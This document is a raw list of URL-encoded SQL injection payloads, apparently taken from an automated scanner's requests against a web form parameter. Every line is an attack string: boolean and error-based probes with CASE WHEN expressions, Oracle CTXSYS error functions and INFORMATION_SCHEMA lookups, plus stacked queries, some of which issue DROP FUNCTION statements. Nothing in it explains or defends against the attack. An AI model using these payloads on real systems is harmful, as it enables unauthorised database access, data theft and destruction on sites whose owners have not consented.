+1%') AND (SELECT (CASE WHEN (5310=8028) THEN NULL ELSE CAST((CHR(116)||CHR(75)||CHR(99)||CHR(68)) AS NUMERIC) END)) IS NULL AND ('%'='&Submit=Submit
+1%')) AND (SELECT (CASE WHEN (3143=3454) THEN NULL ELSE CAST((CHR(122)||CHR(71)||CHR(68)||CHR(119)) AS NUMERIC) END)) IS NULL AND (('%'='&Submit=Submit
+1%')) AND (SELECT (CASE WHEN (2943=2943) THEN NULL ELSE CAST((CHR(120)||CHR(116)||CHR(112)||CHR(97)) AS NUMERIC) END)) IS NULL AND (('%'='&Submit=Submit
+1%')) AND (SELECT (CASE WHEN (3711=3969) THEN NULL ELSE CAST((CHR(112)||CHR(116)||CHR(113)||CHR(67)) AS NUMERIC) END)) IS NULL AND (('%'='&Submit=Submit
+1%' AND (SELECT (CASE WHEN (6204=3204) THEN NULL ELSE CAST((CHR(101)||CHR(120)||CHR(105)||CHR(72)) AS NUMERIC) END)) IS NULL AND '%'='&Submit=Submit
+1%' AND (SELECT (CASE WHEN (2943=2943) THEN NULL ELSE CAST((CHR(120)||CHR(116)||CHR(112)||CHR(97)) AS NUMERIC) END)) IS NULL AND '%'='&Submit=Submit
+1%' AND (SELECT (CASE WHEN (3567=7594) THEN NULL ELSE CAST((CHR(67)||CHR(82)||CHR(105)||CHR(109)) AS NUMERIC) END)) IS NULL AND '%'='&Submit=Submit
+1%" AND (SELECT (CASE WHEN (4609=8220) THEN NULL ELSE CAST((CHR(75)||CHR(108)||CHR(73)||CHR(113)) AS NUMERIC) END)) IS NULL AND "%"="&Submit=Submit
+1%" AND (SELECT (CASE WHEN (2943=2943) THEN NULL ELSE CAST((CHR(120)||CHR(116)||CHR(112)||CHR(97)) AS NUMERIC) END)) IS NULL AND "%"="&Submit=Submit
+1%" AND (SELECT (CASE WHEN (7745=9856) THEN NULL ELSE CAST((CHR(119)||CHR(98)||CHR(122)||CHR(103)) AS NUMERIC) END)) IS NULL AND "%"="&Submit=Submit
+1) AND (SELECT (CASE WHEN (5871=1820) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,5871) END) FROM DUAL) IS NULL-- uYgH&Submit=Submit
+1) AND (SELECT (CASE WHEN (5342=5342) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,5342) END) FROM DUAL) IS NULL-- mXnn&Submit=Submit
+1) AND (SELECT (CASE WHEN (8938=8878) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,8938) END) FROM DUAL) IS NULL-- EVZq&Submit=Submit
+1) AND (SELECT (CASE WHEN (5999=3176) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,5999) END) FROM DUAL) IS NULL AND (4469=4469&Submit=Submit
+1) AND (SELECT (CASE WHEN (5342=5342) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,5342) END) FROM DUAL) IS NULL AND (7293=7293&Submit=Submit
+1) AND (SELECT (CASE WHEN (9995=7553) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,9995) END) FROM DUAL) IS NULL AND (8400=8400&Submit=Submit
+1)) AND (SELECT (CASE WHEN (1462=7860) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,1462) END) FROM DUAL) IS NULL AND ((4416=4416&Submit=Submit
+1)) AND (SELECT (CASE WHEN (5342=5342) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,5342) END) FROM DUAL) IS NULL AND ((9455=9455&Submit=Submit
+1)) AND (SELECT (CASE WHEN (9249=9038) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,9249) END) FROM DUAL) IS NULL AND ((8100=8100&Submit=Submit
+1))) AND (SELECT (CASE WHEN (2904=8448) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,2904) END) FROM DUAL) IS NULL AND (((8697=8697&Submit=Submit
+1))) AND (SELECT (CASE WHEN (5342=5342) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,5342) END) FROM DUAL) IS NULL AND (((7973=7973&Submit=Submit
+1))) AND (SELECT (CASE WHEN (8660=6768) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,8660) END) FROM DUAL) IS NULL AND (((9052=9052&Submit=Submit
+1 AND (SELECT (CASE WHEN (3052=8248) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,3052) END) FROM DUAL) IS NULL&Submit=Submit
+1 AND (SELECT (CASE WHEN (5342=5342) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,5342) END) FROM DUAL) IS NULL&Submit=Submit
+1 AND (SELECT (CASE WHEN (8964=2220) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,8964) END) FROM DUAL) IS NULL&Submit=Submit
+1 AND (SELECT (CASE WHEN (7528=2749) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,7528) END) FROM DUAL) IS NULL-- bJtB&Submit=Submit
+1 AND (SELECT (CASE WHEN (5342=5342) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,5342) END) FROM DUAL) IS NULL-- BoJf&Submit=Submit
+1 AND (SELECT (CASE WHEN (4816=4035) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,4816) END) FROM DUAL) IS NULL-- WgLI&Submit=Submit
+1 AND (SELECT (CASE WHEN (3220=7298) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,3220) END) FROM DUAL) IS NULL# PJaD&Submit=Submit
+1 AND (SELECT (CASE WHEN (5342=5342) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,5342) END) FROM DUAL) IS NULL# gyDb&Submit=Submit
+1 AND (SELECT (CASE WHEN (4761=1617) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,4761) END) FROM DUAL) IS NULL# rgRU&Submit=Submit
+1' AND (SELECT (CASE WHEN (1965=1662) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,1965) END) FROM DUAL) IS NULL-- gAmL&Submit=Submit
+1' AND (SELECT (CASE WHEN (5342=5342) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,5342) END) FROM DUAL) IS NULL-- VuRG&Submit=Submit
+1' AND (SELECT (CASE WHEN (5962=1374) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,5962) END) FROM DUAL) IS NULL-- DJdn&Submit=Submit
+1') AND (SELECT (CASE WHEN (5135=1358) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,5135) END) FROM DUAL) IS NULL AND ('YjCS'='YjCS&Submit=Submit
+1') AND (SELECT (CASE WHEN (5342=5342) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,5342) END) FROM DUAL) IS NULL AND ('AEnz'='AEnz&Submit=Submit
+1') AND (SELECT (CASE WHEN (6062=1795) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,6062) END) FROM DUAL) IS NULL AND ('hoYt'='hoYt&Submit=Submit
+1')) AND (SELECT (CASE WHEN (8661=3610) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,8661) END) FROM DUAL) IS NULL AND (('EtXQ'='EtXQ&Submit=Submit
+1')) AND (SELECT (CASE WHEN (5342=5342) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,5342) END) FROM DUAL) IS NULL AND (('MIww'='MIww&Submit=Submit
+1')) AND (SELECT (CASE WHEN (1656=2960) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,1656) END) FROM DUAL) IS NULL AND (('YsXt'='YsXt&Submit=Submit
+1'))) AND (SELECT (CASE WHEN (1422=8920) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,1422) END) FROM DUAL) IS NULL AND ((('AeqS'='AeqS&Submit=Submit
+1'))) AND (SELECT (CASE WHEN (5342=5342) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,5342) END) FROM DUAL) IS NULL AND ((('SVKZ'='SVKZ&Submit=Submit
+1'))) AND (SELECT (CASE WHEN (9434=9447) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,9434) END) FROM DUAL) IS NULL AND ((('bOJt'='bOJt&Submit=Submit
+1' AND (SELECT (CASE WHEN (3837=9161) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,3837) END) FROM DUAL) IS NULL AND 'StLm'='StLm&Submit=Submit
+1' AND (SELECT (CASE WHEN (5342=5342) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,5342) END) FROM DUAL) IS NULL AND 'HnzH'='HnzH&Submit=Submit
+1' AND (SELECT (CASE WHEN (2027=4513) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,2027) END) FROM DUAL) IS NULL AND 'qIaM'='qIaM&Submit=Submit
+1') AND (SELECT (CASE WHEN (7594=4157) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,7594) END) FROM DUAL) IS NULL AND ('ZqKG' LIKE 'ZqKG&Submit=Submit
+1') AND (SELECT (CASE WHEN (5342=5342) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,5342) END) FROM DUAL) IS NULL AND ('yknE' LIKE 'yknE&Submit=Submit
+1') AND (SELECT (CASE WHEN (9580=4624) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,9580) END) FROM DUAL) IS NULL AND ('YjEj' LIKE 'YjEj&Submit=Submit
+1')) AND (SELECT (CASE WHEN (7402=4100) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,7402) END) FROM DUAL) IS NULL AND (('Wqap' LIKE 'Wqap&Submit=Submit
+1')) AND (SELECT (CASE WHEN (5342=5342) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,5342) END) FROM DUAL) IS NULL AND (('YtAH' LIKE 'YtAH&Submit=Submit
+1')) AND (SELECT (CASE WHEN (3589=1274) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,3589) END) FROM DUAL) IS NULL AND (('dChj' LIKE 'dChj&Submit=Submit
+1' AND (SELECT (CASE WHEN (6283=1193) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,6283) END) FROM DUAL) IS NULL AND 'TQQr' LIKE 'TQQr&Submit=Submit
+1' AND (SELECT (CASE WHEN (5342=5342) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,5342) END) FROM DUAL) IS NULL AND 'YpOX' LIKE 'YpOX&Submit=Submit
+1' AND (SELECT (CASE WHEN (4856=8991) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,4856) END) FROM DUAL) IS NULL AND 'Jfka' LIKE 'Jfka&Submit=Submit
+1") AND (SELECT (CASE WHEN (8257=2166) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,8257) END) FROM DUAL) IS NULL AND ("bnjS"="bnjS&Submit=Submit
+1") AND (SELECT (CASE WHEN (5342=5342) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,5342) END) FROM DUAL) IS NULL AND ("ATJW"="ATJW&Submit=Submit
+1") AND (SELECT (CASE WHEN (8235=5073) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,8235) END) FROM DUAL) IS NULL AND ("iaRr"="iaRr&Submit=Submit
+1")) AND (SELECT (CASE WHEN (8581=3219) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,8581) END) FROM DUAL) IS NULL AND (("xZIm"="xZIm&Submit=Submit
+1")) AND (SELECT (CASE WHEN (5342=5342) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,5342) END) FROM DUAL) IS NULL AND (("atxo"="atxo&Submit=Submit
+1")) AND (SELECT (CASE WHEN (4298=5536) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,4298) END) FROM DUAL) IS NULL AND (("djJW"="djJW&Submit=Submit
+1" AND (SELECT (CASE WHEN (1683=2495) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,1683) END) FROM DUAL) IS NULL AND "Bfzo"="Bfzo&Submit=Submit
+1" AND (SELECT (CASE WHEN (5342=5342) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,5342) END) FROM DUAL) IS NULL AND "ZBHE"="ZBHE&Submit=Submit
+1" AND (SELECT (CASE WHEN (7450=2758) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,7450) END) FROM DUAL) IS NULL AND "UslY"="UslY&Submit=Submit
+1") AND (SELECT (CASE WHEN (8831=7978) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,8831) END) FROM DUAL) IS NULL AND ("jNSU" LIKE "jNSU&Submit=Submit
+1") AND (SELECT (CASE WHEN (5342=5342) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,5342) END) FROM DUAL) IS NULL AND ("Hlld" LIKE "Hlld&Submit=Submit
+1") AND (SELECT (CASE WHEN (9798=3944) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,9798) END) FROM DUAL) IS NULL AND ("imHx" LIKE "imHx&Submit=Submit
+1" AND (SELECT (CASE WHEN (9695=9539) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,9695) END) FROM DUAL) IS NULL AND "CLOc" LIKE "CLOc&Submit=Submit
+1" AND (SELECT (CASE WHEN (5342=5342) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,5342) END) FROM DUAL) IS NULL AND "BUhJ" LIKE "BUhJ&Submit=Submit
+1" AND (SELECT (CASE WHEN (8420=2151) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,8420) END) FROM DUAL) IS NULL AND "GvCX" LIKE "GvCX&Submit=Submit
+1%') AND (SELECT (CASE WHEN (1336=2558) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,1336) END) FROM DUAL) IS NULL AND ('%'='&Submit=Submit
+1%') AND (SELECT (CASE WHEN (5342=5342) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,5342) END) FROM DUAL) IS NULL AND ('%'='&Submit=Submit
+1%') AND (SELECT (CASE WHEN (3547=1810) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,3547) END) FROM DUAL) IS NULL AND ('%'='&Submit=Submit
+1%')) AND (SELECT (CASE WHEN (8957=5225) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,8957) END) FROM DUAL) IS NULL AND (('%'='&Submit=Submit
+1%')) AND (SELECT (CASE WHEN (5342=5342) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,5342) END) FROM DUAL) IS NULL AND (('%'='&Submit=Submit
+1%')) AND (SELECT (CASE WHEN (7068=2388) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,7068) END) FROM DUAL) IS NULL AND (('%'='&Submit=Submit
+1%' AND (SELECT (CASE WHEN (5001=8719) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,5001) END) FROM DUAL) IS NULL AND '%'='&Submit=Submit
+1%' AND (SELECT (CASE WHEN (5342=5342) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,5342) END) FROM DUAL) IS NULL AND '%'='&Submit=Submit
+1%' AND (SELECT (CASE WHEN (7918=3098) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,7918) END) FROM DUAL) IS NULL AND '%'='&Submit=Submit
+1%" AND (SELECT (CASE WHEN (7712=5493) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,7712) END) FROM DUAL) IS NULL AND "%"="&Submit=Submit
+1%" AND (SELECT (CASE WHEN (5342=5342) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,5342) END) FROM DUAL) IS NULL AND "%"="&Submit=Submit
+1%" AND (SELECT (CASE WHEN (8797=8570) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,8797) END) FROM DUAL) IS NULL AND "%"="&Submit=Submit
+(SELECT (CASE WHEN (9171=9033) THEN 9171 ELSE 9171*(SELECT 9171 FROM INFORMATION_SCHEMA.PLUGINS) END))&Submit=Submit
+(SELECT (CASE WHEN (9202=9202) THEN 9202 ELSE 9202*(SELECT 9202 FROM INFORMATION_SCHEMA.PLUGINS) END))&Submit=Submit
+(SELECT (CASE WHEN (5555=8047) THEN 5555 ELSE 5555*(SELECT 5555 FROM INFORMATION_SCHEMA.PLUGINS) END))&Submit=Submit
+(SELECT (CASE WHEN (3916=7679) THEN 3916 ELSE 1/(SELECT 0) END))&Submit=Submit
+(SELECT (CASE WHEN (3646=3646) THEN 3646 ELSE 1/(SELECT 0) END))&Submit=Submit
+(SELECT (CASE WHEN (3067=4513) THEN 3067 ELSE 1/(SELECT 0) END))&Submit=Submit
+(SELECT (CASE WHEN (7409=8540) THEN 7409 ELSE 7409*(SELECT 7409 UNION ALL SELECT 8540) END))&Submit=Submit
+(SELECT (CASE WHEN (3619=3619) THEN 3619 ELSE 3619*(SELECT 3619 UNION ALL SELECT 4773) END))&Submit=Submit
+(SELECT (CASE WHEN (5873=3206) THEN 5873 ELSE 5873*(SELECT 5873 UNION ALL SELECT 3206) END))&Submit=Submit
+(SELECT (CASE WHEN (8700=3311) THEN 8700 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)&Submit=Submit
+(SELECT (CASE WHEN (6238=6238) THEN 6238 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)&Submit=Submit
+(SELECT (CASE WHEN (5331=7562) THEN 5331 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)&Submit=Submit
+(SELECT (CASE WHEN (5744=7890) THEN 5744 ELSE 1/0 END) FROM SYSMASTER:SYSDUAL)&Submit=Submit
+(SELECT (CASE WHEN (8626=8626) THEN 8626 ELSE 1/0 END) FROM SYSMASTER:SYSDUAL)&Submit=Submit
+(SELECT (CASE WHEN (1099=3867) THEN 1099 ELSE 1/0 END) FROM SYSMASTER:SYSDUAL)&Submit=Submit
+IIF(6366=1610,6366,1/0)&Submit=Submit
+IIF(3501=3501,3501,1/0)&Submit=Submit
+IIF(9427=1240,9427,1/0)&Submit=Submit
+(CASE WHEN (6600=1899) THEN 6600 ELSE 6600*(SELECT 6600 FROM DUAL UNION SELECT 1899 FROM DUAL) END)&Submit=Submit
+(CASE WHEN (1320=1320) THEN 1320 ELSE 1320*(SELECT 1320 FROM DUAL UNION SELECT 3015 FROM DUAL) END)&Submit=Submit
+(CASE WHEN (9192=4834) THEN 9192 ELSE 9192*(SELECT 9192 FROM DUAL UNION SELECT 4834 FROM DUAL) END)&Submit=Submit
+(CASE WHEN 9648=6627 THEN 9648 ELSE NULL END)&Submit=Submit
+(CASE WHEN 8167=8167 THEN 8167 ELSE NULL END)&Submit=Submit
+(CASE WHEN 6382=2841 THEN 6382 ELSE NULL END)&Submit=Submit
+1,(SELECT (CASE WHEN (1823=8452) THEN 1 ELSE 1823*(SELECT 1823 FROM INFORMATION_SCHEMA.PLUGINS) END))&Submit=Submit
+1,(SELECT (CASE WHEN (6543=6543) THEN 1 ELSE 6543*(SELECT 6543 FROM INFORMATION_SCHEMA.PLUGINS) END))&Submit=Submit
+1,(SELECT (CASE WHEN (8457=7646) THEN 1 ELSE 8457*(SELECT 8457 FROM INFORMATION_SCHEMA.PLUGINS) END))&Submit=Submit
+1',(SELECT (CASE WHEN (7318=9603) THEN 1 ELSE 7318*(SELECT 7318 FROM INFORMATION_SCHEMA.PLUGINS) END))-- sZRk&Submit=Submit
+1',(SELECT (CASE WHEN (6543=6543) THEN 1 ELSE 6543*(SELECT 6543 FROM INFORMATION_SCHEMA.PLUGINS) END))-- dbKk&Submit=Submit
+1',(SELECT (CASE WHEN (1623=5075) THEN 1 ELSE 1623*(SELECT 1623 FROM INFORMATION_SCHEMA.PLUGINS) END))-- XaxJ&Submit=Submit
+1,(SELECT (CASE WHEN (8032=4462) THEN 1 ELSE 1/(SELECT 0) END))&Submit=Submit
+1,(SELECT (CASE WHEN (2676=2676) THEN 1 ELSE 1/(SELECT 0) END))&Submit=Submit
+1,(SELECT (CASE WHEN (3265=9058) THEN 1 ELSE 1/(SELECT 0) END))&Submit=Submit
+1',(SELECT (CASE WHEN (9675=8436) THEN 1 ELSE 1/(SELECT 0) END))-- gOJi&Submit=Submit
+1',(SELECT (CASE WHEN (2676=2676) THEN 1 ELSE 1/(SELECT 0) END))-- neIl&Submit=Submit
+1',(SELECT (CASE WHEN (4213=2297) THEN 1 ELSE 1/(SELECT 0) END))-- otRs&Submit=Submit
+1,(SELECT (CASE WHEN (5876=5829) THEN 1 ELSE 5876*(SELECT 5876 UNION ALL SELECT 5829) END))&Submit=Submit
+1,(SELECT (CASE WHEN (9800=9800) THEN 1 ELSE 9800*(SELECT 9800 UNION ALL SELECT 2408) END))&Submit=Submit
+1,(SELECT (CASE WHEN (2729=6516) THEN 1 ELSE 2729*(SELECT 2729 UNION ALL SELECT 6516) END))&Submit=Submit
+1',(SELECT (CASE WHEN (6377=6691) THEN 1 ELSE 6377*(SELECT 6377 UNION ALL SELECT 6691) END))-- IJAl&Submit=Submit
+1',(SELECT (CASE WHEN (9800=9800) THEN 1 ELSE 9800*(SELECT 9800 UNION ALL SELECT 2408) END))-- OsUY&Submit=Submit
+1',(SELECT (CASE WHEN (8825=2052) THEN 1 ELSE 8825*(SELECT 8825 UNION ALL SELECT 2052) END))-- gFkz&Submit=Submit
+1,(SELECT (CASE WHEN (6020=3357) THEN 1 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)&Submit=Submit
+1,(SELECT (CASE WHEN (9487=9487) THEN 1 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)&Submit=Submit
+1,(SELECT (CASE WHEN (3706=8329) THEN 1 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)&Submit=Submit
+1',(SELECT (CASE WHEN (8858=5001) THEN 1 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)-- fBiq&Submit=Submit
+1',(SELECT (CASE WHEN (9487=9487) THEN 1 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)-- WAhv&Submit=Submit
+1',(SELECT (CASE WHEN (5162=2088) THEN 1 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)-- IMtW&Submit=Submit
+1);SELECT (CASE WHEN (2235=7248) THEN 2235 ELSE 1/(SELECT 0) END)--&Submit=Submit
+1);SELECT (CASE WHEN (5837=5837) THEN 5837 ELSE 1/(SELECT 0) END)--&Submit=Submit
+1);SELECT (CASE WHEN (7169=8192) THEN 7169 ELSE 1/(SELECT 0) END)--&Submit=Submit
+1));SELECT (CASE WHEN (9606=3823) THEN 9606 ELSE 1/(SELECT 0) END)--&Submit=Submit
+1));SELECT (CASE WHEN (5837=5837) THEN 5837 ELSE 1/(SELECT 0) END)--&Submit=Submit
+1));SELECT (CASE WHEN (2227=7121) THEN 2227 ELSE 1/(SELECT 0) END)--&Submit=Submit
+1)));SELECT (CASE WHEN (8493=8284) THEN 8493 ELSE 1/(SELECT 0) END)--&Submit=Submit
+1)));SELECT (CASE WHEN (5837=5837) THEN 5837 ELSE 1/(SELECT 0) END)--&Submit=Submit
+1)));SELECT (CASE WHEN (2194=7867) THEN 2194 ELSE 1/(SELECT 0) END)--&Submit=Submit
+1;SELECT (CASE WHEN (5537=2807) THEN 5537 ELSE 1/(SELECT 0) END)--&Submit=Submit
+1;SELECT (CASE WHEN (5837=5837) THEN 5837 ELSE 1/(SELECT 0) END)--&Submit=Submit
+1;SELECT (CASE WHEN (1879=2520) THEN 1879 ELSE 1/(SELECT 0) END)--&Submit=Submit
+1';SELECT (CASE WHEN (3961=2722) THEN 3961 ELSE 1/(SELECT 0) END)--&Submit=Submit
+1';SELECT (CASE WHEN (5837=5837) THEN 5837 ELSE 1/(SELECT 0) END)--&Submit=Submit
+1';SELECT (CASE WHEN (7813=4900) THEN 7813 ELSE 1/(SELECT 0) END)--&Submit=Submit
+1');SELECT (CASE WHEN (5415=2138) THEN 5415 ELSE 1/(SELECT 0) END)--&Submit=Submit
+1');SELECT (CASE WHEN (5837=5837) THEN 5837 ELSE 1/(SELECT 0) END)--&Submit=Submit
+1');SELECT (CASE WHEN (6260=6771) THEN 6260 ELSE 1/(SELECT 0) END)--&Submit=Submit
+1'));SELECT (CASE WHEN (4790=6022) THEN 4790 ELSE 1/(SELECT 0) END)--&Submit=Submit
+1'));SELECT (CASE WHEN (5837=5837) THEN 5837 ELSE 1/(SELECT 0) END)--&Submit=Submit
+1'));SELECT (CASE WHEN (6565=7095) THEN 6565 ELSE 1/(SELECT 0) END)--&Submit=Submit
+1')));SELECT (CASE WHEN (6965=7891) THEN 6965 ELSE 1/(SELECT 0) END)--&Submit=Submit
+1')));SELECT (CASE WHEN (5837=5837) THEN 5837 ELSE 1/(SELECT 0) END)--&Submit=Submit
+1')));SELECT (CASE WHEN (1172=1374) THEN 1172 ELSE 1/(SELECT 0) END)--&Submit=Submit
+1");SELECT (CASE WHEN (1485=4215) THEN 1485 ELSE 1/(SELECT 0) END)--&Submit=Submit
+1");SELECT (CASE WHEN (5837=5837) THEN 5837 ELSE 1/(SELECT 0) END)--&Submit=Submit
+1");SELECT (CASE WHEN (5065=4171) THEN 5065 ELSE 1/(SELECT 0) END)--&Submit=Submit
+1"));SELECT (CASE WHEN (4166=7722) THEN 4166 ELSE 1/(SELECT 0) END)--&Submit=Submit
+1"));SELECT (CASE WHEN (5837=5837) THEN 5837 ELSE 1/(SELECT 0) END)--&Submit=Submit
+1"));SELECT (CASE WHEN (8380=5806) THEN 8380 ELSE 1/(SELECT 0) END)--&Submit=Submit
+1";SELECT (CASE WHEN (9339=3561) THEN 9339 ELSE 1/(SELECT 0) END)--&Submit=Submit
+1";SELECT (CASE WHEN (5837=5837) THEN 5837 ELSE 1/(SELECT 0) END)--&Submit=Submit
+1";SELECT (CASE WHEN (5903=7353) THEN 5903 ELSE 1/(SELECT 0) END)--&Submit=Submit
+1%');SELECT (CASE WHEN (7563=4688) THEN 7563 ELSE 1/(SELECT 0) END)--&Submit=Submit
+1%');SELECT (CASE WHEN (5837=5837) THEN 5837 ELSE 1/(SELECT 0) END)--&Submit=Submit
+1%');SELECT (CASE WHEN (3498=8396) THEN 3498 ELSE 1/(SELECT 0) END)--&Submit=Submit
+1%'));SELECT (CASE WHEN (9662=4756) THEN 9662 ELSE 1/(SELECT 0) END)--&Submit=Submit
+1%'));SELECT (CASE WHEN (5837=5837) THEN 5837 ELSE 1/(SELECT 0) END)--&Submit=Submit
+1%'));SELECT (CASE WHEN (3018=1458) THEN 3018 ELSE 1/(SELECT 0) END)--&Submit=Submit
+1%';SELECT (CASE WHEN (9709=5732) THEN 9709 ELSE 1/(SELECT 0) END)--&Submit=Submit
+1%';SELECT (CASE WHEN (5837=5837) THEN 5837 ELSE 1/(SELECT 0) END)--&Submit=Submit
+1%';SELECT (CASE WHEN (4168=5880) THEN 4168 ELSE 1/(SELECT 0) END)--&Submit=Submit
+1%";SELECT (CASE WHEN (8843=4884) THEN 8843 ELSE 1/(SELECT 0) END)--&Submit=Submit
+1%";SELECT (CASE WHEN (5837=5837) THEN 5837 ELSE 1/(SELECT 0) END)--&Submit=Submit
+1%";SELECT (CASE WHEN (4405=3427) THEN 4405 ELSE 1/(SELECT 0) END)--&Submit=Submit
+1);IF(5185=2814) SELECT 5185 ELSE DROP FUNCTION MKxT--&Submit=Submit
+1);IF(6147=6147) SELECT 6147 ELSE DROP FUNCTION tWIt--&Submit=Submit
+1);IF(7082=5341) SELECT 7082 ELSE DROP FUNCTION Wsnz--&Submit=Submit
+1));IF(3715=8044) SELECT 3715 ELSE DROP FUNCTION Xfll--&Submit=Submit
+1));IF(6147=6147) SELECT 6147 ELSE DROP FUNCTION tWIt--&Submit=Submit
+1));IF(9642=3234) SELECT 9642 ELSE DROP FUNCTION nVOx--&Submit=Submit
+1)));IF(6941=1022) SELECT 6941 ELSE DROP FUNCTION LlZZ--&Submit=Submit
+1)));IF(6147=6147) SELECT 6147 ELSE DROP FUNCTION tWIt--&Submit=Submit
+1)));IF(1123=6013) SELECT 1123 ELSE DROP FUNCTION mMqD--&Submit=Submit
+1;IF(1145=4066) SELECT 1145 ELSE DROP FUNCTION xxAq--&Submit=Submit
+1;IF(6147=6147) SELECT 6147 ELSE DROP FUNCTION tWIt--&Submit=Submit
+1;IF(8531=8254) SELECT 8531 ELSE DROP FUNCTION PbmL--&Submit=Submit
+1';IF(5149=4158) SELECT 5149 ELSE DROP FUNCTION jMbV--&Submit=Submit
+1';IF(6147=6147) SELECT 6147 ELSE DROP FUNCTION tWIt--&Submit=Submit
+1';IF(7510=1606) SELECT 7510 ELSE DROP FUNCTION pNYz--&Submit=Submit
+1');IF(4060=4285) SELECT 4060 ELSE DROP FUNCTION Vbdw--&Submit=Submit
+1');IF(6147=6147) SELECT 6147 ELSE DROP FUNCTION tWIt--&Submit=Submit
+1');IF(5224=3188) SELECT 5224 ELSE DROP FUNCTION TzFo--&Submit=Submit
+1'));IF(1410=5749) SELECT 1410 ELSE DROP FUNCTION LhHp--&Submit=Submit
+1'));IF(6147=6147) SELECT 6147 ELSE DROP FUNCTION tWIt--&Submit=Submit
+1'));IF(7188=6253) SELECT 7188 ELSE DROP FUNCTION jlDl--&Submit=Submit
+1')));IF(9833=8130) SELECT 9833 ELSE DROP FUNCTION iuvj--&Submit=Submit
+1')));IF(6147=6147) SELECT 6147 ELSE DROP FUNCTION tWIt--&Submit=Submit
+1')));IF(3191=8786) SELECT 3191 ELSE DROP FUNCTION IwbA--&Submit=Submit
+1");IF(5004=9854) SELECT 5004 ELSE DROP FUNCTION aIpL--&Submit=Submit
+1");IF(6147=6147) SELECT 6147 ELSE DROP FUNCTION tWIt--&Submit=Submit
+1");IF(9901=3677) SELECT 9901 ELSE DROP FUNCTION ASCz--&Submit=Submit
+1"));IF(4036=2553) SELECT 4036 ELSE DROP FUNCTION coEF--&Submit=Submit
+1"));IF(6147=6147) SELECT 6147 ELSE DROP FUNCTION tWIt--&Submit=Submit
+1"));IF(8978=6967) SELECT 8978 ELSE DROP FUNCTION ZEyZ--&Submit=Submit
+1";IF(7163=2549) SELECT 7163 ELSE DROP FUNCTION WgBd--&Submit=Submit
